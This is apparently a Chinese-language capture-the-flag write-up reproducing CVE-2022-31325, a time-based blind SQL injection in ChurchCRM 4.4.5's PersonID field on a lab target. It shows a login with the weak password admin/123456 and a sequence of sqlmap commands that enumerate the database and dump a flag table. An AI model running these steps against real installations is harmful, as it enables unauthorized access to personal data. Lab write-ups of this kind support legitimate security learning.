## 漏洞简介：

ChurchCRM是一个开源的管理软件，采用PHP语言和其他来构建。

ChurchCRM在4.4.5版本中存在SQL注入漏洞。在WhyCameEditor.php
中的“PersonID”字段由于未进行用户输入过滤，导致存在SQL注入漏洞。攻击者可利用该漏洞对目标有针对性的发起攻击，危害站点系统安全。

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-31325

## 漏洞复现：

访问漏洞环境，发现要登录尝试常见弱口令账户密码，发现账户密码为admin/123456

![](https://image.3001.net/images/20230702/1688268718_64a0efae5744e8210ce17.png!small)

  

进入后台后，根据漏洞简介寻找到漏洞利用点

![](https://image.3001.net/images/20230702/1688268740_64a0efc4ea228c35cb923.png!small)![](https://image.3001.net/images/20230702/1688268751_64a0efcfe895777d38315.png!small)![](https://image.3001.net/images/20230702/1688268760_64a0efd84227bc558ccc5.png!small)

  

打开burpsuite抓取点击save的数据包放到sqlmap中去跑，发现存在sql注入

![](https://image.3001.net/images/20230702/1688268783_64a0efef8d1208caf8bc1.png!small)

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" -p "PersonID" --batch

![](https://image.3001.net/images/20230702/1688268812_64a0f00cf2ab93e6844ae.png!small)![](https://image.3001.net/images/20230702/1688268829_64a0f01d462f76739cbd4.png!small)

  

查询当前数据库名

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" -p "PersonID" –-current-db --batch

![](https://image.3001.net/images/20230702/1688268852_64a0f034368458cafb8f1.png!small)![](https://image.3001.net/images/20230702/1688268864_64a0f04067edc2df4fbce.png!small)

  

获取ctf数据库表名

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" -p "PersonID" –D ctf --tables
> --batch

![](https://image.3001.net/images/20230702/1688268880_64a0f050e59fb24b1aea9.png!small)

由于是时间盲注，耗费的时间比较多，看到flag表就停止了，flag应该在flag表中

![](https://image.3001.net/images/20230702/1688268903_64a0f06761a7441ed0d77.png!small)

  

获取flag表中的字段

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" -p "PersonID" –D ctf -T flag
> --columns --batch

![](https://image.3001.net/images/20230702/1688268932_64a0f084c927d92c38475.png!small)![](https://image.3001.net/images/20230702/1688268955_64a0f09b6e91e6d874756.png!small)

  

获取flag

> 命令：python sqlmap.py -r "存放数据包的txt文件的位置" -p "PersonID" –D ctf -T flag -C
> “flag” -dump --batch

![](https://image.3001.net/images/20230702/1688269029_64a0f0e52b3337752fe1e.png!small)

  

